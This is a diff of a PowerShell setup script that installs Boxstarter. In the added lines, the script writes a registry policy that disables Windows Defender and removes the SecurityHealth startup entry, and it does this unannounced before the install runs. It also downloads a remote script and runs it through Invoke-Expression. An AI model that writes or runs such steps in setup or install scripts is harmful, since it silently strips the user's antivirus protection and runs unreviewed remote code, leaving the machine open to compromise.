@@ -15,8 +15,7 @@ function Join-Initial
     
       try {
         
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
-        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
+        
         Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://boxstarter.org/bootstrapper.ps1')); get-boxstarter -Force
         return $true
         Write-Host "Boxstarter Instalado!!" -ForegroundColor Green
@@ -144,6 +143,8 @@ function Test-HostSupported
    }
  
    
+
+
   
 }
 
@@ -164,6 +165,8 @@ function Install-Module{
   Test-HostSupported;
   Test-PSProfile;
   Install-Module;
+  Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
+  Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
   Install-BoxStarter
  
 
